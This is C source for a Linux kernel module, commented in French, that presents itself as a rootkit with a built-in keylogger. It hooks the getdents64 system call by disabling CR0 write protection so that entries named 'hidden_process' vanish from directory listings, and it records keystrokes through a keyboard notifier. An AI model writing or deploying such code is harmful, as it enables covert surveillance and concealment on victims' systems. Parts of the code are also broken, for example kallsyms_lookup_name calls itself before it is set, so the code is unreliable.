#include <linux/module.h>         // Inclusion des headers nécessaires
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/version.h>
#include <linux/kbd_kern.h>
#include <linux/keyboard.h>
#include <linux/input.h>

// Informations sur le module
MODULE_LICENSE("GPL");                         // Licence du module
MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez"); // Auteur(s) du module
MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré"); // Description du module

// Déclaration de kallsyms_lookup_name pour trouver des symboles dans le noyau
static unsigned long (*kallsyms_lookup_name)(const char *name);

unsigned long *syscall_table;                  // Pointeur vers la table des appels système

// Pointeurs pour stocker les adresses des fonctions d'origine
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);
asmlinkage int (*original_sys_open)(const char __user *, int, umode_t);

// Buffer pour stocker les frappes de clavier
static char keystroke_buffer[1024];            // Tableau pour enregistrer les frappes de clavier
static int buffer_index = 0;                   // Index pour le tableau de frappes

// Fonction hookée pour getdents (pour cacher des fichiers)
asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    int nread;
    struct linux_dirent64 *d, *kdirent, *prev = NULL;
    unsigned long offset = 0;

    nread = original_getdents(fd, dirp, count); // Appel de la fonction originale
    if (nread <= 0)
        return nread;

    kdirent = kzalloc(nread, GFP_KERNEL);       // Allocation mémoire
    if (kdirent == NULL)
        return nread;

    if (copy_from_user(kdirent, dirp, nread)) { // Copie des données utilisateur dans le noyau
        kfree(kdirent);                         // Libération de la mémoire si erreur
        return nread;
    }

    while (offset < nread) {
        d = (struct linux_dirent64 *)((char *)kdirent + offset); // Itération sur les entrées de répertoire
        if (strstr(d->d_name, "hidden_process")) { // Si le nom de fichier contient "hidden_process"
            if (prev)
                prev->d_reclen += d->d_reclen;   // Fusionne avec l'entrée précédente
            else
                memmove(d, (char *)d + d->d_reclen, (nread - offset - d->d_reclen)); // Cache l'entrée
            nread -= d->d_reclen;                // Réduit la taille lue
        } else {
            prev = d;                            // Met à jour l'entrée précédente
        }
        offset += d->d_reclen;                   // Passe à l'entrée suivante
    }

    if (copy_to_user(dirp, kdirent, nread)) {    // Copie des données modifiées vers l'utilisateur
        kfree(kdirent);                         // Libération de la mémoire
        return nread;
    }

    kfree(kdirent);                             // Libération de la mémoire
    return nread;
}

// Fonction pour enregistrer les frappes de clavier
static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    
    if (code == KBD_KEYSYM && param->down) {    // Si une touche est enfoncée
        keystroke_buffer[buffer_index++] = param->value; // Enregistre la valeur de la touche
        if (buffer_index >= sizeof(keystroke_buffer))
            buffer_index = 0;                   // Réinitialise l'index si le buffer est plein
    }

    return NOTIFY_OK;                           // Retourne OK pour notifier que l'événement est géré
}

// Structure pour enregistrer le keylogger
static struct notifier_block keylogger_notifier = {
    .notifier_call = keylogger_notify           // Associe la fonction keylogger_notify à la structure
};

// Fonction d'initialisation du rootkit
static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");       // Affiche un message de chargement du rootkit

    // Localisation de kallsyms_lookup_name
    kallsyms_lookup_name = (void *)kallsyms_lookup_name("kallsyms_lookup_name");

    // Localisation de la table des appels système
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // Localisation des adresses des fonctions d'origine
    write_cr0(read_cr0() & (~0x10000));         // Désactive la protection en écriture du CR0
    original_getdents = (void*)syscall_table[__NR_getdents64]; // Sauvegarde la fonction originale getdents
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents; // Remplace par la fonction hookée
    write_cr0(read_cr0() | 0x10000);            // Réactive la protection en écriture du CR0

    // Enregistrer le notifier pour le keylogger
    register_keyboard_notifier(&keylogger_notifier); // Enregistre la fonction de keylogger

    return 0;
}

// Fonction de nettoyage du rootkit
static void __exit rootkit_exit(void) {
    // Restauration des adresses des fonctions d'origine
    write_cr0(read_cr0() & (~0x10000));         // Désactive la protection en écriture du CR0
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents; // Restaure la fonction originale getdents
    write_cr0(read_cr0() | 0x10000);            // Réactive la protection en écriture du CR0

    // Désenregistrer le notifier pour le keylogger
    unregister_keyboard_notifier(&keylogger_notifier); // Désenregistre la fonction de keylogger

    printk(KERN_INFO "Rootkit unloaded\n");     // Affiche un message de déchargement du rootkit
}

module_init(rootkit_init);                      // Indique la fonction d'initialisation du module
module_exit(rootkit_exit);                      // Indique la fonction de nettoyage du module
